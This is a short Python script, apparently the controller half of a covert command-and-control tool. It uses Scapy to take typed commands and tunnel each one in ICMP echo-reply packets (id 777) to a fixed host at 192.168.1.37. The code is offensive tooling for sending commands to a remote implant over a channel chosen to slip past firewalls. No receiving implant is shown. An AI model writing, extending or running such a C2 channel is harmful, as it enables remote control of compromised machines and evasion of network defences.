import scapy
from scapy.all import *
import time


def encender_c2():
    print("empezamos")

    encender_servidor = True
    while encender_servidor:
        shell = input("comandos")
        if shell == "exit":
            encender_servidor = False
        elif shell == '':
            pass
        else:
            send(IP(dst="192.168.1.37")/ICMP(type=0, id=777)/Raw(load=shell))
            time.sleep(1)


if __name__ == '__main__':
    encender_c2()
